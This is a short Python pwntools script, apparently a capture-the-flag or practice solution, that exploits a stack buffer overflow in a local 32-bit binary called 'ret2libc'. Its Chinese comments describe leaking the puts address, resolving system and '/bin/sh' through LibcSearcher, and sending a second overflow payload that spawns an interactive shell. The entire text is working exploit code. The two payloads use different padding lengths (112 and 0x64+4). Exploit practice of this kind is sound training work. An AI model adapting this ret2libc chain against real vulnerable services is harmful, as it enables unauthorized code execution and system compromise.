from pwn import *
from LibcSearcher import *
context(arch='i386', os='linux', log_level='debug')
p   = process('./ret2libc')
elf = ELF('./ret2libc')

main     = elf.symbols['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

p.recvuntil('Can you find it !?')

# 获取puts的真实地址
payload1 = b'a' * 112
payload1 += p32(puts_plt) + p32(main) + p32(puts_got)
p.sendline(payload1)

# 计算出system和/bin/sh的真实地址
puts = u32(p.recv()[:4])
libc = LibcSearcher('puts', puts)
libc_base   = puts - libc.dump('puts')
system = libc_base + libc.dump('system')
binsh  = libc_base + libc.dump('str_bin_sh')

# 执行system('/bin/sh')
payload2 = b'a' * (0x64 + 4)
payload2 += p32(system) + p32(0x0) + p32(binsh)
p.sendline(payload2)
p.interactive()

